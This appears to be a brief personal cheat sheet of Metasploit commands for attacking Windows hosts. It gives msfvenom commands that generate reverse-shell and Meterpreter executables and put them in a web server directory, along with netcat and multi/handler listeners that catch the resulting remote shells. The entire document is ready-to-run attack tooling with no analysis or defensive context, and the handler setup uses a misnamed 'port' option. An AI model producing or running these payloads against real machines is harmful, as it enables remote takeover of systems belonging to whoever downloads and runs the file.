# Create a regular non-staged executable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=444 -f exe -o /var/www/html/shell.exe
```

# Set up Netcat listener
```
nc -lvnp 444
```

Use a browser to download the executable and handle the new netcat session

# Create a x64 staged payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f exe -o /var/www/html/shell.exe
```

# Set up Meterpreter
```
bash$ msfconsole -q
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set lhost 192.168.0.1
msf> set port 443
msf> run
```

